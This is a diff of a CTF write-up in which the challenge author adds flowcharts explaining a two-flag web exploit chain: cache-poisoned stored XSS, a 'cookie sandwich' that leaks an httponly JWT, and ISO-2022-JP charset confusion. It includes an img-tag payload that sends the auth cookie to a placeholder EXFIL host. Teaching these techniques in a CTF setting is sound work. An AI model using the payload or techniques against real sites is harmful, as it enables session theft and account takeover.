@@ -3,12 +3,13 @@ title:  "HACKNYX CTF 2026 - Deskmesh Support (Web)"
 date:   2026-06-23 12:00:00 +0800
 categories: [CTF Writeup, Web Exploitation]
 tags: [HACKNYX CTF 2026]
+mermaid: true
 ---
 
 > This challenge was created by me for HACKNYX CTF 2026 under the Web category. It was **inspired from** the **"Unrealistic Client-Side"** challenge by **SteakEnthusiast** (UofTCTF 2026) — it shares the same class of vulnerabilities and exploit chain, wrapped in a new theme (a support-ticket desk called *Deskmesh*) with its own routes/cookies. Full credit for the original idea goes to him.
 {: .prompt-info}
 
-Hello again! This time I want to walk through a two-flag web challenge I made for GMI CTF 2026. It is a chunky one — there is a single application but **two flags**, and both flags ride on the **same** stored-XSS bootstrap before splitting off into two very different client-side tricks: a **cookie sandwich** and an **ISO-2022-JP charset confusion**. If any of those words sound scary, don't worry — that's the whole point of this writeup. We'll build it up slowly.
+Hello again! This time I want to walk through a two-flag web challenge I made for HACKNYX CTF 2026. It is a chunky one — there is a single application but **two flags**, and both flags ride on the **same** stored-XSS bootstrap before splitting off into two very different client-side tricks: a **cookie sandwich** and an **ISO-2022-JP charset confusion**. If any of those words sound scary, don't worry — that's the whole point of this writeup. We'll build it up slowly.
 
 Because both flags share a long setup, I'll do the recon and the shared XSS primitive ONCE, then branch into Flag 1 and Flag 2 separately.
 
@@ -127,6 +128,19 @@ To make the bot walk that two-step sequence in a single visit, the attacker page
 
 The bot visits `/s1` once per run; the blob's `history.back()` supplies the second hit, so a single bot visit walks the whole sequence: prime cache → cached navigation → XSS executes as admin. Now we can branch into the two flags.
 
+Here is the whole shared bootstrap in one picture:
+
+```mermaid
+flowchart TD
+    A["Bot: log in as admin, then GET /escalate"] --> B["Bot visits attacker /s1 via userinfo trick (passes startswith check)"]
+    B --> C["/s1 first hit: window.open('/queue')"]
+    C --> D["queue JS fetches /api/tickets/ID with header X-Desk-Action: view"]
+    D --> E["text/html XSS body cached — no Cache-Control"]
+    E --> F["blob page calls history.back(), re-hitting /s1"]
+    F --> G["/s1 second hit: 302 to /api/tickets/ID"]
+    G --> H["cached text/html served as a document — script runs as admin on :7000"]
+```
+
 ## 3. Flag 1 — the cookie sandwich
 
 **Goal:** read a value the attacker's JS is NOT allowed to read — the flag baked into the admin's `httponly` `auth` JWT.
@@ -176,6 +190,18 @@ Cookie **path** scoping is what forces the send order `banner … auth … dummy
 <p><img src='https://EXFIL/exfil?data=; auth=<flag-bearing JWT>; dummy='/></p>
 ```
 
+Visually, the sandwich looks like this:
+
+```mermaid
+flowchart TD
+    A["XSS runs as admin on :7000"] --> B["Set banner cookie: opens a quote + unterminated img tag (path=/)"]
+    B --> C["window.open('/escalate') → auth cookie reissued WITH flag claim"]
+    C --> D["Set dummy cookie: closes the quote (path=/)"]
+    D --> E["Navigate bot to /status on :7001"]
+    E --> F["Werkzeug quoted-string parse: banner value swallows the httponly auth cookie sitting in between"]
+    F --> G["Reflected as a single img src → browser exfils the flag-bearing JWT to attacker"]
+```
+
 The browser tries to fetch that image → the JWT rides along in the query string → exfiltrated. Now base64-decode the JWT payload (no secret needed, we only want to *read* it):
 
 ```json
@@ -215,6 +241,17 @@ location = '/status';
 
 > Charset confusion is about disagreement: we tell the browser the page is ISO-2022-JP, and under that encoding `ESC $ @` flips a switch so that bytes which *look* like `">` or `<` to you are no longer markup at all — they're just text gobbled up into the attribute. The flag stops being "on the page next to an `<img>`" and becomes "part of the `<img src>`".
 {: .prompt-info }
+
+Here's the flow of how the flag gets pulled into the image URL:
+
+```mermaid
+flowchart TD
+    A["banner cookie injects: meta charset=ISO-2022-JP + img src=...data= + ESC dollar at"] --> B["browser parses the page as ISO-2022-JP"]
+    B --> C["ESC dollar at switches the parser into double-byte mode"]
+    C --> D["flag bytes printed after the injection point are consumed as text INSIDE the img src"]
+    D --> E["attacker username in footer emits ESC open B → back to ASCII, ending the run"]
+    E --> F["img src now carries the flag → browser requests it → flag exfiltrated"]
+```
 
 So where does the closing `ESC ( B` come from? We seed it ourselves through the attacker's own **username** in the page footer. `templates/base.html` renders `current_username` inside `<code>…</code>`, and Jinja's autoescape leaves the raw `ESC ( B` control bytes untouched. So the solver simply registers with a username that ends in that escape:
 
